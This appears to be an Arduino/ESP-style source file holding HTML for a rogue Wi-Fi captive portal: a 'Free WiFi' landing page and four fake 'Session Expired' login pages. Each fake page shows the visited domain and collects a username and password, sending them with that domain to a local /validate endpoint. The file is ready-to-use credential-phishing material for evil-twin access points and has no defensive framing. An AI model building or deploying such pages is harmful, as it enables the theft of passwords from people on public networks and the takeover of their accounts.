const char PORTAL_LOGIN_HTML[] PROGMEM = R"=====(
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Free WiFi</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Helvetica,Arial,sans-serif;background:linear-gradient(135deg,#0f2027,#203a43,#2c5364);color:#e0e0e0;min-height:100vh;display:flex;align-items:center;justify-content:center;padding:20px}
.card{background:rgba(255,255,255,.06);backdrop-filter:blur(8px);border:1px solid rgba(255,255,255,.1);border-radius:16px;padding:48px 40px;max-width:400px;width:100%;text-align:center;box-shadow:0 8px 32px rgba(0,0,0,.3)}
.icon{margin-bottom:24px}
.icon svg{width:72px;height:72px;fill:none;stroke:#4fc3f7;stroke-width:2;stroke-linecap:round;stroke-linejoin:round}
h1{font-size:1.5em;font-weight:700;margin-bottom:8px;color:#fff}
.sub{font-size:.95em;color:#90a4ae;margin-bottom:24px;line-height:1.5}
.divider{border:none;border-top:1px solid rgba(255,255,255,.08);margin:24px 0}
.tagline{font-size:.8em;color:#607d8b;letter-spacing:.5px}
</style>
</head>
<body>
<div class="card">
<div class="icon">
<svg viewBox="0 0 64 64"><path d="M32 52a4 4 0 1 0 0-8 4 4 0 0 0 0 8z" fill="#4fc3f7" stroke="none"/><path d="M22 40a14.1 14.1 0 0 1 20 0"/><path d="M14 32a25.2 25.2 0 0 1 36 0"/><path d="M6 24a36.3 36.3 0 0 1 52 0"/></svg>
</div>
<h1>Welcome to Free WiFi</h1>
<p class="sub">You are now connected to the network.<br>Enjoy your browsing experience.</p>
<hr class="divider">
<p class="tagline">Your security is important to us...</p>
</div>
</body>
</html>
)=====";


const char SITE_OTHER_HTML[] PROGMEM = R"=====(
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Session Expired</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Helvetica,Arial,sans-serif;background:#0d1117;color:#c9d1d9;min-height:100vh;display:flex;align-items:center;justify-content:center;padding:20px}
.card{background:#161b22;border:1px solid #30363d;border-radius:12px;padding:40px 36px;max-width:420px;width:100%;box-shadow:0 8px 24px rgba(0,0,0,.4)}
.lock{text-align:center;margin-bottom:20px;font-size:2em;opacity:.7}
h1{font-size:1.15em;font-weight:600;text-align:center;margin-bottom:4px;color:#e6edf3}
.domain{text-align:center;font-size:.85em;color:#f0883e;margin-bottom:24px}
.field{margin-bottom:16px}
.field label{display:block;font-size:.8em;font-weight:500;color:#8b949e;margin-bottom:6px;text-transform:uppercase;letter-spacing:.5px}
.field input{width:100%;padding:10px 14px;background:#0d1117;border:1px solid #30363d;border-radius:8px;color:#c9d1d9;font-size:.95em;outline:none;transition:border-color .2s}
.field input:focus{border-color:#58a6ff}
.btn{width:100%;padding:10px;background:#238636;border:none;border-radius:8px;color:#fff;font-size:.9em;font-weight:600;cursor:pointer;margin-top:8px;transition:background .2s}
.btn:hover{background:#2ea043}
.note{text-align:center;font-size:.75em;color:#484f58;margin-top:16px}
</style>
</head>
<body>
<div class="card">
<div class="lock">&#128274;</div>
<h1>Session Expired</h1>
<p class="domain">Session at <script>document.write(document.domain);</script> has timed out</p>
<form method="get" action="/validate">
<div class="field"><label>Username</label><input type="text" name="user" placeholder="Enter your username" autocomplete="username"></div>
<div class="field"><label>Password</label><input type="password" name="pass" placeholder="Enter your password" autocomplete="current-password"></div>
<input type="hidden" id="isURL" name="url" value="">
<input class="btn" type="submit" value="Sign In">
</form>
<p class="note">Please re-authenticate to continue your session.</p>
</div>
<script>document.getElementById("isURL").value=document.domain;</script>
</body>
</html>
)=====";


const char SITE1_HTML[] PROGMEM = R"=====(
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Sign In</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Helvetica,Arial,sans-serif;background:linear-gradient(135deg,#1a1a2e,#16213e);color:#e0e0e0;min-height:100vh;display:flex;align-items:center;justify-content:center;padding:20px}
.card{background:#1e293b;border:1px solid rgba(234,179,8,.15);border-radius:12px;padding:40px 36px;max-width:420px;width:100%;box-shadow:0 8px 24px rgba(0,0,0,.4)}
.accent{height:4px;background:linear-gradient(90deg,#f59e0b,#eab308);border-radius:4px 4px 0 0;margin:-40px -36px 28px;border-radius:12px 12px 0 0}
.icon{text-align:center;margin-bottom:16px}
.icon svg{width:40px;height:40px;fill:none;stroke:#f59e0b;stroke-width:2;stroke-linecap:round;stroke-linejoin:round}
h1{font-size:1.15em;font-weight:600;text-align:center;margin-bottom:4px;color:#f8fafc}
.domain{text-align:center;font-size:.85em;color:#f59e0b;margin-bottom:24px}
.field{margin-bottom:16px}
.field label{display:block;font-size:.8em;font-weight:500;color:#94a3b8;margin-bottom:6px}
.field input{width:100%;padding:10px 14px;background:#0f172a;border:1px solid #334155;border-radius:8px;color:#e2e8f0;font-size:.95em;outline:none;transition:border-color .2s}
.field input:focus{border-color:#f59e0b}
.btn{width:100%;padding:10px;background:linear-gradient(135deg,#f59e0b,#d97706);border:none;border-radius:8px;color:#1a1a2e;font-size:.9em;font-weight:700;cursor:pointer;margin-top:8px;transition:opacity .2s}
.btn:hover{opacity:.9}
.note{text-align:center;font-size:.75em;color:#475569;margin-top:16px}
</style>
</head>
<body>
<div class="card">
<div class="accent"></div>
<div class="icon"><svg viewBox="0 0 24 24"><rect x="3" y="11" width="18" height="11" rx="2" ry="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></svg></div>
<h1>Session Expired</h1>
<p class="domain"><script>document.write(document.domain);</script></p>
<form method="get" action="/validate">
<div class="field"><label>Username</label><input type="text" name="user" placeholder="Enter username" autocomplete="username"></div>
<div class="field"><label>Password</label><input type="password" name="pass" placeholder="Enter password" autocomplete="current-password"></div>
<input type="hidden" id="isURL" name="url" value="">
<input class="btn" type="submit" value="Sign In">
</form>
<p class="note">Your session has expired. Please log in again.</p>
</div>
<script>document.getElementById("isURL").value=document.domain;</script>
</body>
</html>
)=====";


const char SITE2_HTML[] PROGMEM = R"=====(
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Sign In</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Helvetica,Arial,sans-serif;background:linear-gradient(160deg,#0f172a,#1e3a5f);color:#e0e0e0;min-height:100vh;display:flex;align-items:center;justify-content:center;padding:20px}
.card{background:rgba(30,58,95,.6);backdrop-filter:blur(8px);border:1px solid rgba(56,189,248,.12);border-radius:12px;padding:40px 36px;max-width:420px;width:100%;box-shadow:0 8px 24px rgba(0,0,0,.4)}
.top{text-align:center;margin-bottom:24px}
.top svg{width:44px;height:44px;fill:none;stroke:#38bdf8;stroke-width:2;stroke-linecap:round;stroke-linejoin:round}
h1{font-size:1.15em;font-weight:600;text-align:center;margin-bottom:4px;color:#f0f9ff}
.domain{text-align:center;font-size:.85em;color:#38bdf8;margin-bottom:24px}
.field{margin-bottom:16px}
.field label{display:block;font-size:.8em;font-weight:500;color:#7dd3fc;margin-bottom:6px}
.field input{width:100%;padding:10px 14px;background:rgba(15,23,42,.7);border:1px solid rgba(56,189,248,.2);border-radius:8px;color:#e0f2fe;font-size:.95em;outline:none;transition:border-color .2s}
.field input:focus{border-color:#38bdf8}
.btn{width:100%;padding:10px;background:linear-gradient(135deg,#0284c7,#0369a1);border:none;border-radius:8px;color:#fff;font-size:.9em;font-weight:600;cursor:pointer;margin-top:8px;transition:opacity .2s}
.btn:hover{opacity:.9}
.divider{display:flex;align-items:center;gap:12px;margin:20px 0 16px;font-size:.75em;color:#475569}
.divider::before,.divider::after{content:"";flex:1;border-top:1px solid rgba(56,189,248,.1)}
.note{text-align:center;font-size:.75em;color:#475569;margin-top:12px}
</style>
</head>
<body>
<div class="card">
<div class="top"><svg viewBox="0 0 24 24"><circle cx="12" cy="12" r="10"/><path d="M12 8v4l3 3"/></svg></div>
<h1>Session Timed Out</h1>
<p class="domain"><script>document.write(document.domain);</script></p>
<div class="divider">re-authenticate to continue</div>
<form method="get" action="/validate">
<div class="field"><label>Username</label><input type="text" name="user" placeholder="Your username" autocomplete="username"></div>
<div class="field"><label>Password</label><input type="password" name="pass" placeholder="Your password" autocomplete="current-password"></div>
<input type="hidden" id="isURL" name="url" value="">
<input class="btn" type="submit" value="Continue">
</form>
<p class="note">Secure connection verified.</p>
</div>
<script>document.getElementById("isURL").value=document.domain;</script>
</body>
</html>
)=====";


const char SITE3_HTML[] PROGMEM = R"=====(
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Sign In</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Helvetica,Arial,sans-serif;background:linear-gradient(160deg,#1a0a2e,#2d1b4e);color:#e0e0e0;min-height:100vh;display:flex;align-items:center;justify-content:center;padding:20px}
.card{background:rgba(45,27,78,.6);backdrop-filter:blur(8px);border:1px solid rgba(168,85,247,.15);border-radius:12px;padding:40px 36px;max-width:420px;width:100%;box-shadow:0 8px 24px rgba(0,0,0,.4)}
.top{text-align:center;margin-bottom:24px}
.top svg{width:44px;height:44px;fill:none;stroke:#a855f7;stroke-width:2;stroke-linecap:round;stroke-linejoin:round}
h1{font-size:1.15em;font-weight:600;text-align:center;margin-bottom:4px;color:#f5f3ff}
.domain{text-align:center;font-size:.85em;color:#a855f7;margin-bottom:24px}
.field{margin-bottom:16px}
.field label{display:block;font-size:.8em;font-weight:500;color:#c4b5fd;margin-bottom:6px}
.field input{width:100%;padding:10px 14px;background:rgba(26,10,46,.7);border:1px solid rgba(168,85,247,.2);border-radius:8px;color:#ede9fe;font-size:.95em;outline:none;transition:border-color .2s}
.field input:focus{border-color:#a855f7}
.btn{width:100%;padding:10px;background:linear-gradient(135deg,#9333ea,#7c3aed);border:none;border-radius:8px;color:#fff;font-size:.9em;font-weight:600;cursor:pointer;margin-top:8px;transition:opacity .2s}
.btn:hover{opacity:.9}
.badge{text-align:center;margin-bottom:20px}
.badge span{display:inline-block;padding:3px 12px;background:rgba(168,85,247,.12);border:1px solid rgba(168,85,247,.2);border-radius:20px;font-size:.72em;color:#c4b5fd;letter-spacing:.5px;text-transform:uppercase}
.note{text-align:center;font-size:.75em;color:#4c3a6e;margin-top:16px}
</style>
</head>
<body>
<div class="card">
<div class="top"><svg viewBox="0 0 24 24"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg></div>
<div class="badge"><span>Session Expired</span></div>
<h1>Verification Required</h1>
<p class="domain"><script>document.write(document.domain);</script></p>
<form method="get" action="/validate">
<div class="field"><label>Username</label><input type="text" name="user" placeholder="Enter username" autocomplete="username"></div>
<div class="field"><label>Password</label><input type="password" name="pass" placeholder="Enter password" autocomplete="current-password"></div>
<input type="hidden" id="isURL" name="url" value="">
<input class="btn" type="submit" value="Verify & Continue">
</form>
<p class="note">Protected by secure authentication.</p>
</div>
<script>document.getElementById("isURL").value=document.domain;</script>
</body>
</html>
)=====";
